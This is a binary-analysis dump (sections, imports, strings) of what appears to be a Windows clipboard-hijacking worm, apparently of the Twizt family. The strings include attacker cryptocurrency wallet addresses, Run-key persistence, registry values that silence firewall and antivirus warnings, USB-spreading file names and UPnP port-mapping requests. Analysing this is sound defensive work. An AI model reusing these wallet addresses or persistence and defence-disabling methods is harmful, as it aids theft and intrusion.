Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xd400 0x00401000  0xe000 -r-x .text
1   0x0000d800  0x2e00 0x0040f000  0x3000 -r-- .rdata
2   0x00010600   0x800 0x00412000  0x2000 -rw- .data

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00405930 paddr=0x00004d30 haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
15  0x0000d9c0 0x0040f1c0 NONE FUNC 0    USER32.dll   imp.GetClipboardData
16  0x0000d9c4 0x0040f1c4 NONE FUNC 0    USER32.dll   imp.CreateWindowExW
17  0x0000d9c8 0x0040f1c8 NONE FUNC 0    USER32.dll   imp.DispatchMessageA
18  0x0000d9cc 0x0040f1cc NONE FUNC 0    USER32.dll   imp.OpenClipboard
19  0x0000d9d0 0x0040f1d0 NONE FUNC 0    USER32.dll   imp.SetClipboardData
20  0x0000d9d4 0x0040f1d4 NONE FUNC 0    USER32.dll   imp.SetClipboardViewer
1   0x0000d800 0x0040f000 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExW
2   0x0000d804 0x0040f004 NONE FUNC 0    ADVAPI32.dll imp.CryptGenRandom
3   0x0000d808 0x0040f008 NONE FUNC 0    ADVAPI32.dll imp.CryptReleaseContext
4   0x0000d80c 0x0040f00c NONE FUNC 0    ADVAPI32.dll imp.CryptAcquireContextW
5   0x0000d810 0x0040f010 NONE FUNC 0    ADVAPI32.dll imp.RegQueryValueExW
6   0x0000d814 0x0040f014 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExA
7   0x0000d818 0x0040f018 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExA
8   0x0000d81c 0x0040f01c NONE FUNC 0    ADVAPI32.dll imp.RegCloseKey
9   0x0000d820 0x0040f020 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExW
1   0x0000d958 0x0040f158 NONE FUNC 0    SHELL32.dll  imp.ShellExecuteW
1   0x0000dad8 0x0040f2d8 NONE FUNC 0    ole32.dll    imp.CoInitializeEx
2   0x0000dadc 0x0040f2dc NONE FUNC 0    ole32.dll    imp.CoCreateInstance
3   0x0000dae0 0x0040f2e0 NONE FUNC 0    ole32.dll    imp.CoInitialize
4   0x0000dae4 0x0040f2e4 NONE FUNC 0    ole32.dll    imp.CoUninitialize
6   0x0000d94c 0x0040f14c NONE FUNC 0    OLEAUT32.dll imp.SysStringLen
2   0x0000d950 0x0040f150 NONE FUNC 0    OLEAUT32.dll imp.SysReAllocString
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000dafa 0x0040f2fa 4   5    .rdata  ascii   3)6{
1   0x0000db47 0x0040f347 4   5    .rdata  ascii   FUKR
2   0x0000db4c 0x0040f34c 4   10   .rdata  utf16le open
3   0x0000db58 0x0040f358 6   14   .rdata  utf16le %temp%
4   0x0000db68 0x0040f368 11  24   .rdata  utf16le %s\%d%d.exe
5   0x0000db80 0x0040f380 114 230  .rdata  utf16le Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
6   0x0000dc68 0x0040f468 18  38   .rdata  utf16le %s:Zone.Identifier
7   0x0000dc90 0x0040f490 9   20   .rdata  utf16le %s\%d.exe
8   0x0000dca4 0x0040f4a4 18  38   .rdata  utf16le %s:Zone.Identifier
9   0x0000dcd0 0x0040f4d0 15  16   .rdata  ascii   HTTP/1.1 200 OK
10  0x0000dce0 0x0040f4e0 10  11   .rdata  ascii   LOCATION: 
11  0x0000dcec 0x0040f4ec 15  16   .rdata  ascii   239.255.255.250
12  0x0000dcfc 0x0040f4fc 4   10   .rdata  utf16le Body
13  0x0000dd08 0x0040f508 135 136  .rdata  ascii   M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
14  0x0000dd90 0x0040f590 7   16   .rdata  utf16le service
15  0x0000dda0 0x0040f5a0 11  24   .rdata  utf16le serviceType
16  0x0000ddb8 0x0040f5b8 11  24   .rdata  utf16le serviceList
17  0x0000ddd0 0x0040f5d0 6   14   .rdata  utf16le device
18  0x0000dde0 0x0040f5e0 10  22   .rdata  utf16le deviceType
19  0x0000ddf8 0x0040f5f8 10  22   .rdata  utf16le deviceList
20  0x0000de10 0x0040f610 51  104  .rdata  utf16le urn:schemas-upnp-org:device:InternetGatewayDevice:1
21  0x0000de78 0x0040f678 39  80   .rdata  utf16le urn:schemas-upnp-org:device:WANDevice:1
22  0x0000dec8 0x0040f6c8 49  100  .rdata  utf16le urn:schemas-upnp-org:device:WANConnectionDevice:1
23  0x0000df2c 0x0040f72c 28  58   .rdata  utf16le GetExternalIPAddressResponse
24  0x0000df68 0x0040f768 46  94   .rdata  utf16le urn:schemas-upnp-org:service:WANIPConnection:1
25  0x0000dfc8 0x0040f7c8 47  96   .rdata  utf16le urn:schemas-upnp-org:service:WANPPPConnection:1
26  0x0000e028 0x0040f828 10  22   .rdata  utf16le controlURL
27  0x0000e040 0x0040f840 7   16   .rdata  utf16le URLBase
28  0x0000e050 0x0040f850 4   5    .rdata  ascii   %S%S
29  0x0000e058 0x0040f858 46  47   .rdata  ascii   Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
30  0x0000e088 0x0040f888 4   5    .rdata  ascii   POST
31  0x0000e090 0x0040f890 103 104  .rdata  ascii   Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
32  0x0000e0f8 0x0040f8f8 303 304  .rdata  ascii   <?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:GetExternalIPAddress xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"/></SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n
33  0x0000e228 0x0040fa28 81  82   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"
34  0x0000e27c 0x0040fa7c 20  42   .rdata  utf16le NewExternalIPAddress
35  0x0000e2a8 0x0040faa8 641 642  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
36  0x0000e530 0x0040fd30 75  76   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
37  0x0000e580 0x0040fd80 442 443  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost>%s</NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n</m:DeletePortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
38  0x0000e740 0x0040ff40 78  79   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"
39  0x0000e79c 0x0040ff9c 6   7    .rdata  ascii   twizt)
40  0x0000e7a4 0x0040ffa4 6   7    .rdata  ascii   twizt)
41  0x0000e7ac 0x0040ffac 6   7    .rdata  ascii   twizt)
42  0x0000e7b4 0x0040ffb4 6   7    .rdata  ascii   twizt)
43  0x0000e7bc 0x0040ffbc 24  25   .rdata  ascii   www.update.microsoft.com
44  0x0000e7e1 0x0040ffe1 8   11   .rdata  utf8    Ȫ4d(2dwh blocks=Latin Extended-B,Basic Latin
45  0x0000e817 0x00410017 5   6    .rdata  ascii   T1`m\n
46  0x0000e81f 0x0041001f 4   5    .rdata  ascii   J\r."
47  0x0000e84b 0x0041004b 5   6    .rdata  ascii   c"5o\r
48  0x0000e85f 0x0041005f 8   9    .rdata  ascii   shttp://
49  0x0000e868 0x00410068 5   6    .rdata  ascii   38r30
50  0x0000e870 0x00410070 13  28   .rdata  utf16le winudsvcs.exe
51  0x0000e88c 0x0041008c 13  28   .rdata  utf16le VolDriver.exe
52  0x0000e8a8 0x004100a8 32  66   .rdata  utf16le Microsoft Windows Update Service
53  0x0000e8ec 0x004100ec 4   10   .rdata  utf16le open
54  0x0000e8f8 0x004100f8 18  38   .rdata  utf16le %s:Zone.Identifier
55  0x0000e920 0x00410120 13  28   .rdata  utf16le %userprofile%
56  0x0000e93c 0x0041013c 13  28   .rdata  utf16le winudsvcs.exe
57  0x0000e958 0x00410158 8   18   .rdata  utf16le %windir%
58  0x0000e96c 0x0041016c 5   12   .rdata  utf16le %s\%s
59  0x0000e978 0x00410178 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
60  0x0000e9d8 0x004101d8 5   12   .rdata  utf16le %s\%s
61  0x0000e9e4 0x004101e4 34  35   .rdata  ascii   SOFTWARE\Microsoft\Security Center
62  0x0000ea08 0x00410208 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
63  0x0000ea68 0x00410268 16  17   .rdata  ascii   FirewallOverride
64  0x0000ea7c 0x0041027c 21  22   .rdata  ascii   FirewallDisableNotify
65  0x0000ea94 0x00410294 19  20   .rdata  ascii   AntiSpywareOverride
66  0x0000eaa8 0x004102a8 17  18   .rdata  ascii   AntiVirusOverride
67  0x0000eabc 0x004102bc 22  23   .rdata  ascii   AntiVirusDisableNotify
68  0x0000ead4 0x004102d4 15  16   .rdata  ascii   UpdatesOverride
69  0x0000eae4 0x004102e4 20  21   .rdata  ascii   UpdatesDisableNotify
70  0x0000eafc 0x004102fc 38  39   .rdata  ascii   SOFTWARE\Microsoft\Security Center\Svc
71  0x0000eb24 0x00410324 16  17   .rdata  ascii   FirewallOverride
72  0x0000eb38 0x00410338 21  22   .rdata  ascii   FirewallDisableNotify
73  0x0000eb50 0x00410350 19  20   .rdata  ascii   AntiSpywareOverride
74  0x0000eb64 0x00410364 17  18   .rdata  ascii   AntiVirusOverride
75  0x0000eb78 0x00410378 22  23   .rdata  ascii   AntiVirusDisableNotify
76  0x0000eb90 0x00410390 15  16   .rdata  ascii   UpdatesOverride
77  0x0000eba0 0x004103a0 20  21   .rdata  ascii   UpdatesDisableNotify
78  0x0000ebb8 0x004103b8 15  32   .rdata  utf16le %s\nodescfg.dat
79  0x0000ebd8 0x004103d8 13  28   .rdata  utf16le %s\cmdcfg.dat
80  0x0000ebf4 0x004103f4 21  44   .rdata  utf16le Microsoft Corporation
81  0x0000ec20 0x00410420 4   10   .rdata  utf16le \??\
82  0x0000ec30 0x00410430 59  120  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
83  0x0000eca8 0x004104a8 8   18   .rdata  utf16le NoDrives
84  0x0000ecbc 0x004104bc 16  34   .rdata  utf16le %s\VolDriver.exe
85  0x0000ece0 0x004104e0 21  44   .rdata  utf16le %windir%\explorer.exe
86  0x0000ed0c 0x0041050c 4   10   .rdata  utf16le %s\*
87  0x0000ed24 0x00410524 5   12   .rdata  utf16le %s\%s
88  0x0000ed30 0x00410530 5   12   .rdata  utf16le %s\%s
89  0x0000ed3c 0x0041053c 6   14   .rdata  utf16le %s.lnk
90  0x0000ed4c 0x0041054c 5   12   .rdata  utf16le %s\%s
91  0x0000ed58 0x00410558 19  40   .rdata  utf16le %s\%s\VolDriver.exe
92  0x0000ed80 0x00410580 5   12   .rdata  utf16le %s\%s
93  0x0000ed8c 0x0041058c 4   10   .rdata  utf16le %s\*
94  0x0000ed98 0x00410598 11  24   .rdata  utf16le shell32.dll
95  0x0000edb0 0x004105b0 11  24   .rdata  utf16le shell32.dll
96  0x0000edc8 0x004105c8 5   12   .rdata  utf16le *.lnk
97  0x0000edd4 0x004105d4 5   12   .rdata  utf16le *.vbs
98  0x0000ede0 0x004105e0 4   10   .rdata  utf16le *.js
99  0x0000edec 0x004105ec 10  22   .rdata  utf16le *.inf*.scr
100 0x0000ee04 0x00410604 5   12   .rdata  utf16le *.com
101 0x0000ee10 0x00410610 5   12   .rdata  utf16le *.jse
102 0x0000ee1c 0x0041061c 5   12   .rdata  utf16le *.cmd
103 0x0000ee28 0x00410628 5   12   .rdata  utf16le *.pif
104 0x0000ee34 0x00410634 5   12   .rdata  utf16le *.jar
105 0x0000ee40 0x00410640 5   12   .rdata  utf16le *.dll
106 0x0000ee4c 0x0041064c 5   12   .rdata  utf16le *.vbe
107 0x0000ee58 0x00410658 5   12   .rdata  utf16le *.bat
108 0x0000ee64 0x00410664 9   20   .rdata  utf16le Thumbs.db
109 0x0000ee78 0x00410678 12  26   .rdata  utf16le $RECYCLE.BIN
110 0x0000ee94 0x00410694 11  24   .rdata  utf16le desktop.ini
111 0x0000eeac 0x004106ac 25  52   .rdata  utf16le System Volume Information
112 0x0000eeec 0x004106ec 5   12   .rdata  utf16le %s\%s
113 0x0000eef8 0x004106f8 5   12   .rdata  utf16le %s\%s
114 0x0000ef04 0x00410704 8   18   .rdata  utf16le %s\%s\%s
115 0x0000ef18 0x00410718 7   16   .rdata  utf16le  (%dGB)
116 0x0000ef28 0x00410728 14  30   .rdata  utf16le Unnamed volume
117 0x0000ef48 0x00410748 4   10   .rdata  utf16le %s%s
118 0x0000ef54 0x00410754 12  26   .rdata  utf16le bitcoincash:
119 0x0000ef70 0x00410770 6   14   .rdata  utf16le cosmos
120 0x0000ef80 0x00410780 4   10   .rdata  utf16le addr
121 0x0000ef8c 0x0041078c 12  26   .rdata  utf16le bitcoincash:
122 0x0000efa8 0x004107a8 21  22   .rdata  ascii   13537267282679196401L
123 0x0000efc0 0x004107c0 48  49   .rdata  ascii   14T6qgnx6kQrxgr6asZR8UwvSYuLWUq3AHEUyArFbropQRWp
124 0x0000eff4 0x004107f4 34  35   .rdata  ascii   12ZcTiGZFWydqY4rDW6FbF1ArsBbdNaPxz
125 0x0000f018 0x00410818 35  36   .rdata  ascii   3P99cyMypyaBthhNh1VLrtF7gjsHNxooth5
126 0x0000f03c 0x0041083c 34  35   .rdata  ascii   3NNJW9YnKichMXTVgAhrsD65veUBCfGC9m
127 0x0000f060 0x00410860 42  43   .rdata  ascii   qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
128 0x0000f08c 0x0041088c 34  35   .rdata  ascii   XkTJhYh432bGU2dMScEWmNLfyNTun3n52p
129 0x0000f0b0 0x004108b0 34  35   .rdata  ascii   DMfPdibKCp79N5sLqsLkqx7W7gyzS8dhK6
130 0x0000f0d4 0x004108d4 42  43   .rdata  ascii   0xEa375AfbDa5e11af6F93932ef2dcDe2Cf38768Dd
131 0x0000f100 0x00410900 34  35   .rdata  ascii   LhqqjWGpEEKDnZZVozMqYVax9zAzjQPJMW
132 0x0000f124 0x00410924 34  35   .rdata  ascii   r3qS691ECDBqnCAa2Xq26HF55R38pyd2SU
133 0x0000f148 0x00410948 34  35   .rdata  ascii   TMumxbBnZn723FeqRnjZUbfvVvvmNaEyEY
134 0x0000f16c 0x0041096c 35  36   .rdata  ascii   t1J1JV7W2DgMbJCmzv3DKq69erCQ9sM7J8G
135 0x0000f190 0x00410990 36  37   .rdata  ascii   tz1MQTA4y7zjDP8E3f7JxJpqA768QvhkQtwQ
136 0x0000f1b8 0x004109b8 42  43   .rdata  ascii   hx76ca924ed3a86365aa684755d07ff587399a44a3
137 0x0000f1e4 0x004109e4 34  35   .rdata  ascii   QQyZHrgfAZUm6bqf19u3TZRfLU1szkWdAK
138 0x0000f208 0x00410a08 34  35   .rdata  ascii   RWGY1zEN78ivFTZiMtiLLXYugjUM2Ezgdn
139 0x0000f22c 0x00410a2c 40  41   .rdata  ascii   NDV3Q755N5RLBJIHD7O2MDQLHF7BGY7C5UFHJQJD
140 0x0000f258 0x00410a58 34  35   .rdata  ascii   Aa6J2zX3FmXqZ1Vr6KB7SHEJeDQgZ9L1m9
141 0x0000f27c 0x00410a7c 34  35   .rdata  ascii   SW7RcT7KzjDRZUeo33ULvuvgnk1vsfRu9h
142 0x0000f2a0 0x00410aa0 78  79   .rdata  ascii   zs1gdxkmsegruyeu72ehpfwgshmcup4sqxm7kafju9r7xjcfww8vlg7ar9rqraxmjhr9rdn2hj9v7w
143 0x0000f2f0 0x00410af0 42  43   .rdata  ascii   zil1ks8wccts9uum532l6mt7zfn7v3grplu5plc7rd
144 0x0000f31c 0x00410b1c 35  36   .rdata  ascii   s1QvSmGpRS7hxnjjfLvCkeDmy3MprJkpWBe
145 0x0000f340 0x00410b40 11  24   .rdata  utf16le bitcoincash
146 0x0000f358 0x00410b58 54  55   .rdata  ascii   bitcoincash:qps3rmvkxc2qe0dxlffnxe6jvv90xtp8tcxquxva6v
147 0x0000f390 0x00410b90 6   14   .rdata  utf16le cosmos
148 0x0000f3a0 0x00410ba0 45  46   .rdata  ascii   cosmos18uv6asl0trdgeu0gajph8amh30qskjfeu7xsxf
149 0x0000f3d0 0x00410bd0 95  96   .rdata  ascii   46JBkCw1vWw2torA5cF6WwdPsjc4EziJE62PHWBKqkLmXVonQjSM5jk5zp1QfSjj2wPjzoLU64qGReNNouP2LLKBMJAZgbr
150 0x0000f430 0x00410c30 4   10   .rdata  utf16le addr
151 0x0000f440 0x00410c40 103 104  .rdata  ascii   addr1q82kgwmvcs3lcfaws5rq30cq94ek9nzqygcfj2a6045hpg8yjrm9xsu92x0lv30wldh80xqwtmxrc3jfetrzvnmstchq00s0sh
152 0x0000f4a8 0x00410ca8 34  35   .rdata  ascii   FWjKuczvp1fBH95y6c5j3koVX2TZDVR3V9
153 0x0000f4cc 0x00410ccc 56  57   .rdata  ascii   GB47TTMWVEURE5VW5NN56QFDW7X2OOSXKLL6KJIB4FQ3YMRUZXXE7P7W
154 0x0000f508 0x00410d08 34  35   .rdata  ascii   GgY5yz2QmGk9jtk6WZ9dTYjt4oQumDpQS2
155 0x0000f534 0x00410d34 42  43   .rdata  ascii   bnb1ssq338y72jd2l0h53ujc8hn8ef9axa2d372gga
156 0x0000f560 0x00410d60 4   10   .rdata  utf16le band
157 0x0000f56c 0x00410d6c 43  44   .rdata  ascii   band17rdtnrylr8dlt88qpzqp8j588h5w2qnclf764u
158 0x0000f5a0 0x00410da0 42  43   .rdata  ascii   bc1q6rzlelsxd9xadajkjwqdwr72rl9ll7g29yxzqr
159 0x0000f5cc 0x00410dcc 9   10   .rdata  ascii   U30212907
160 0x0000f5d8 0x00410dd8 9   10   .rdata  ascii   E30940134
161 0x0000f5e4 0x00410de4 9   10   .rdata  ascii   B30912949
162 0x0000f5f0 0x00410df0 4   10   .rdata  utf16le %x%X
163 0x0000f5fe 0x00410dfe 4   5    .rdata  ascii   L09n
164 0x0000f620 0x00410e20 4   5    .rdata  ascii   b'kJ
165 0x0000fa84 0x00411284 10  11   .rdata  ascii   WS2_32.dll
166 0x0000fa92 0x00411292 7   8    .rdata  ascii   StrStrW
167 0x0000fa9c 0x0041129c 15  16   .rdata  ascii   PathFileExistsW
168 0x0000faae 0x004112ae 8   9    .rdata  ascii   StrCmpNW
169 0x0000faba 0x004112ba 14  15   .rdata  ascii   PathMatchSpecW
170 0x0000facc 0x004112cc 8   9    .rdata  ascii   StrCpyNW
171 0x0000fad8 0x004112d8 17  18   .rdata  ascii   PathFindFileNameW
172 0x0000faec 0x004112ec 8   9    .rdata  ascii   StrStrIA
173 0x0000faf8 0x004112f8 7   8    .rdata  ascii   StrChrA
174 0x0000fb02 0x00411302 9   10   .rdata  ascii   StrCmpNIA
175 0x0000fb0c 0x0041130c 11  12   .rdata  ascii   SHLWAPI.dll
176 0x0000fb1a 0x0041131a 18  19   .rdata  ascii   URLDownloadToFileW
177 0x0000fb2e 0x0041132e 10  11   .rdata  ascii   urlmon.dll
178 0x0000fb3c 0x0041133c 16  17   .rdata  ascii   InternetConnectA
179 0x0000fb50 0x00411350 17  18   .rdata  ascii   InternetCrackUrlA
180 0x0000fb64 0x00411364 16  17   .rdata  ascii   InternetReadFile
181 0x0000fb78 0x00411378 16  17   .rdata  ascii   HttpOpenRequestA
182 0x0000fb8c 0x0041138c 22  23   .rdata  ascii   HttpAddRequestHeadersA
183 0x0000fba6 0x004113a6 16  17   .rdata  ascii   HttpSendRequestA
184 0x0000fbba 0x004113ba 13  14   .rdata  ascii   InternetOpenA
185 0x0000fbca 0x004113ca 19  20   .rdata  ascii   InternetCloseHandle
186 0x0000fbe0 0x004113e0 13  14   .rdata  ascii   InternetOpenW
187 0x0000fbf0 0x004113f0 16  17   .rdata  ascii   InternetOpenUrlW
188 0x0000fc02 0x00411402 11  12   .rdata  ascii   WININET.dll
189 0x0000fc10 0x00411410 7   8    .rdata  ascii   isalpha
190 0x0000fc1a 0x0041141a 7   8    .rdata  ascii   isdigit
191 0x0000fc24 0x00411424 6   7    .rdata  ascii   strstr
192 0x0000fc2e 0x0041142e 7   8    .rdata  ascii   memmove
193 0x0000fc38 0x00411438 17  18   .rdata  ascii   NtQuerySystemTime
194 0x0000fc4c 0x0041144c 25  26   .rdata  ascii   RtlTimeToSecondsSince1980
195 0x0000fc68 0x00411468 8   9    .rdata  ascii   mbstowcs
196 0x0000fc72 0x00411472 9   10   .rdata  ascii   ntdll.dll
197 0x0000fc7e 0x0041147e 10  11   .rdata  ascii   _vscprintf
198 0x0000fc8c 0x0041148c 4   5    .rdata  ascii   rand
199 0x0000fc94 0x00411494 5   6    .rdata  ascii   srand
200 0x0000fc9a 0x0041149a 10  11   .rdata  ascii   msvcrt.dll
201 0x0000fca8 0x004114a8 8   9    .rdata  ascii   lstrlenA
202 0x0000fcb4 0x004114b4 10  11   .rdata  ascii   GlobalLock
203 0x0000fcc2 0x004114c2 16  17   .rdata  ascii   GetModuleHandleW
204 0x0000fcd6 0x004114d6 12  13   .rdata  ascii   GetTickCount
205 0x0000fce6 0x004114e6 11  12   .rdata  ascii   GlobalAlloc
206 0x0000fcf4 0x004114f4 5   6    .rdata  ascii   Sleep
207 0x0000fcfc 0x004114fc 9   10   .rdata  ascii   lstrcpynW
208 0x0000fd08 0x00411508 10  11   .rdata  ascii   ExitThread
209 0x0000fd16 0x00411516 19  20   .rdata  ascii   MultiByteToWideChar
210 0x0000fd2c 0x0041152c 8   9    .rdata  ascii   lstrlenW
211 0x0000fd38 0x00411538 12  13   .rdata  ascii   GlobalUnlock
212 0x0000fd48 0x00411548 11  12   .rdata  ascii   GetFileSize
213 0x0000fd56 0x00411556 13  14   .rdata  ascii   MapViewOfFile
214 0x0000fd66 0x00411566 15  16   .rdata  ascii   UnmapViewOfFile
215 0x0000fd78 0x00411578 9   10   .rdata  ascii   WriteFile
216 0x0000fd84 0x00411584 25  26   .rdata  ascii   InitializeCriticalSection
217 0x0000fda0 0x004115a0 20  21   .rdata  ascii   LeaveCriticalSection
218 0x0000fdb8 0x004115b8 11  12   .rdata  ascii   CreateFileW
219 0x0000fdc6 0x004115c6 16  17   .rdata  ascii   FlushFileBuffers
220 0x0000fdda 0x004115da 20  21   .rdata  ascii   EnterCriticalSection
221 0x0000fdf2 0x004115f2 18  19   .rdata  ascii   CreateFileMappingW
222 0x0000fe08 0x00411608 11  12   .rdata  ascii   CloseHandle
223 0x0000fe16 0x00411616 14  15   .rdata  ascii   FindFirstFileW
224 0x0000fe28 0x00411628 13  14   .rdata  ascii   GetDriveTypeW
225 0x0000fe38 0x00411638 11  12   .rdata  ascii   MoveFileExW
226 0x0000fe46 0x00411646 16  17   .rdata  ascii   CreateDirectoryW
227 0x0000fe5a 0x0041165a 16  17   .rdata  ascii   GetLogicalDrives
228 0x0000fe6e 0x0041166e 9   10   .rdata  ascii   CopyFileW
229 0x0000fe7a 0x0041167a 18  19   .rdata  ascii   GetModuleFileNameW
230 0x0000fe90 0x00411690 8   9    .rdata  ascii   lstrcmpW
231 0x0000fe9c 0x0041169c 9   10   .rdata  ascii   FindClose
232 0x0000fea8 0x004116a8 16  17   .rdata  ascii   RemoveDirectoryW
233 0x0000febc 0x004116bc 15  16   .rdata  ascii   QueryDosDeviceW
234 0x0000fece 0x004116ce 9   10   .rdata  ascii   lstrcmpiW
235 0x0000feda 0x004116da 13  14   .rdata  ascii   FindNextFileW
236 0x0000feea 0x004116ea 19  20   .rdata  ascii   GetDiskFreeSpaceExW
237 0x0000ff00 0x00411700 11  12   .rdata  ascii   DeleteFileW
238 0x0000ff0e 0x0041170e 8   9    .rdata  ascii   lstrcpyW
239 0x0000ff1a 0x0041171a 18  19   .rdata  ascii   SetFileAttributesW
240 0x0000ff30 0x00411730 21  22   .rdata  ascii   GetVolumeInformationW
241 0x0000ff48 0x00411748 11  12   .rdata  ascii   ExitProcess
242 0x0000ff56 0x00411756 12  13   .rdata  ascii   CreateEventA
243 0x0000ff66 0x00411766 12  13   .rdata  ascii   GetLastError
244 0x0000ff76 0x00411776 12  13   .rdata  ascii   CreateMutexA
245 0x0000ff86 0x00411786 12  13   .rdata  ascii   CreateThread
246 0x0000ff96 0x00411796 25  26   .rdata  ascii   ExpandEnvironmentStringsW
247 0x0000ffb2 0x004117b2 11  12   .rdata  ascii   HeapReAlloc
248 0x0000ffc0 0x004117c0 9   10   .rdata  ascii   HeapAlloc
249 0x0000ffcc 0x004117cc 8   9    .rdata  ascii   HeapFree
250 0x0000ffd8 0x004117d8 10  11   .rdata  ascii   HeapCreate
251 0x0000ffe6 0x004117e6 12  13   .rdata  ascii   HeapValidate
252 0x0000fff6 0x004117f6 15  16   .rdata  ascii   GetProcessHeaps
253 0x00010008 0x00411808 18  19   .rdata  ascii   HeapSetInformation
254 0x0001001e 0x0041181e 19  20   .rdata  ascii   GetCurrentProcessId
255 0x00010034 0x00411834 20  21   .rdata  ascii   InterlockedDecrement
256 0x0001004c 0x0041184c 19  20   .rdata  ascii   WaitForSingleObject
257 0x00010062 0x00411862 19  20   .rdata  ascii   InterlockedExchange
258 0x00010078 0x00411878 20  21   .rdata  ascii   InterlockedIncrement
259 0x00010090 0x00411890 22  23   .rdata  ascii   InterlockedExchangeAdd
260 0x000100aa 0x004118aa 17  18   .rdata  ascii   GetCurrentProcess
261 0x000100be 0x004118be 16  17   .rdata  ascii   GetCurrentThread
262 0x000100d2 0x004118d2 17  18   .rdata  ascii   SetThreadPriority
263 0x000100e6 0x004118e6 17  18   .rdata  ascii   GetThreadPriority
264 0x000100fa 0x004118fa 21  22   .rdata  ascii   DeleteCriticalSection
265 0x00010112 0x00411912 15  16   .rdata  ascii   DuplicateHandle
266 0x00010124 0x00411924 14  15   .rdata  ascii   GetLocaleInfoA
